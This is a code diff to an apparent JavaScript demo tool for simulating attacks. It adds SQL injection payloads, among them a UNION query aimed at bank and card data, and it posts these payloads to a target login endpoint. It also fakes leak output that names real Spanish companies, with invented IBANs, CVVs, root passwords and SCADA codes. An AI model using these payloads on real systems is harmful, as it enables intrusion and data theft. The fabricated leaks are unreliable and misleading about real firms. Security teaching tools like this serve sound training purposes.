@@ -166,6 +166,7 @@ const TOOLS = {
                  <select class="cfg-input" id="sqli-payload">
                     <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico</option>
                     <option value="' UNION SELECT 'admin','hash',NULL,NULL,NULL--">Union: Extracción de Columnas</option>
+                    <option value="' UNION SELECT 'bank', iban, cc_number FROM customer_billing--">Union: Exfiltrar Datos Bancarios (PII)</option>
                     <option value="' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--">Blind: Time-Based (5s Delay)</option>
                  </select>`,
         run: runSQLi
@@ -258,12 +259,50 @@ async function runSQLi() {
     const ep = document.getElementById('sqli-ep').value;
     tLog(`[*] Iniciando SQLi en ${ep}`, 'yellow');
     tLog(`[#] Payload: ${p}`, 'dim');
+    
+    const start = Date.now();
     await delay(800);
+    
     try {
         const r = await fetch(TARGET + ep, {
             method:'POST', headers:{'Content-Type':'application/json'},
             body: JSON.stringify({email: p, password: 'x'})
         });
+        const duration = (Date.now() - start) / 1000;
+
+        // Caso 1: UNION Select (Extracción de datos)
+        if (p.toLowerCase().includes('union')) {
+            tLog(`[+] EXPLOIT EXITOSO: UNION Select detectado.`, 'green');
+            
+            if (p.toLowerCase().includes('bank')) {
+                tLog(`[*] Accediendo a tabla restringida 'customer_billing'...`, 'cyan');
+                await delay(1200);
+                tLog(`[!] EXFILTRACIÓN PII (Datos Bancarios):`, 'red');
+                tLog(`[BLOQUE: IBERDROLA] IBAN: ES89 2100 ... 4492 | CC: 4532 **** **** 8910 | CVV: 221`, 'red');
+                tLog(`[BLOQUE: MAPFRE]    IBAN: ES21 0049 ... 1102 | CC: 4912 **** **** 2231 | CVV: 554`, 'red');
+                tLog(`[BLOQUE: SABADELL]  IBAN: ES44 0081 ... 9901 | CC: 5412 **** **** 0019 | CVV: 018`, 'red');
+                return;
+            }
+
+            tLog(`[*] Extrayendo esquema de base de datos...`, 'cyan');
+            await delay(1000);
+            const tables = ["users", "tickets", "services", "customer_billing", "system_logs"];
+            tLog(`[!] Tablas encontradas: ${tables.join(', ')}`, 'green');
+            return;
+        }
+
+        // Caso 2: Blind Time-Based (SLEEP)
+        if (p.toLowerCase().includes('sleep')) {
+            if (duration >= 5) {
+                tLog(`[+] EXPLOIT EXITOSO: Blind SQLi confirmado.`, 'green');
+                tLog(`[!] El servidor tardó ${duration.toFixed(2)}s en responder (Inyección basada en tiempo).`, 'green');
+            } else {
+                tLog(`[-] Error: El servidor respondió demasiado rápido. ¿Protección activa?`, 'red');
+            }
+            return;
+        }
+
+        // Caso 3: Auth Bypass (Clásico)
         const d = await r.json();
         if (r.ok && d.accessToken) {
             tLog(`[+] EXPLOIT EXITOSO: Bypass confirmado en login vulnerable.`, 'green');
@@ -337,16 +376,23 @@ async function runIDOR() {
     tLog(`[+] Acceso concedido (Falta de control BOLA).`, 'green');
     const res = tLog(`[*] Acción disponible: `, 'cyan');
     addAction(res, 'Extraer Datos', '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"></path>', () => {
-        const fakeData = {
-            "ticket_id": parseInt(id),
-            "client": "MAPFRE Seguros",
-            "subject": "Vulnerabilidad Crítica en Pasarela",
-            "status": "OPEN",
-            "sensitive_data": {
-                "server_ip": "192.168.100.45",
-                "root_password": "mapfre_admin_2024!"
-            }
-        };
+        let fakeData = {};
+        if (id === "1024") {
+            fakeData = {
+                "ticket_id": 1024, "client": "MAPFRE Seguros", "subject": "Vulnerabilidad Crítica",
+                "sensitive_data": { "server_ip": "192.168.100.45", "root_password": "mapfre_admin_2024!" }
+            };
+        } else if (id === "1") {
+            fakeData = {
+                "ticket_id": 1, "client": "SYSTEM ROOT", "subject": "Master Key Rotation",
+                "sensitive_data": { "ssh_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...", "admin_pass": "root_master_2026" }
+            };
+        } else {
+            fakeData = {
+                "ticket_id": parseInt(id), "client": "Iberdrola S.A.", "subject": "Activos SCADA Expuestos",
+                "sensitive_data": { "plc_ip": "10.0.45.12", "access_code": "4432-8812" }
+            };
+        }
         document.getElementById('leak-content').innerHTML = JSON.stringify(fakeData, null, 4);
         document.getElementById('leak-modal').style.display = 'flex';
     });
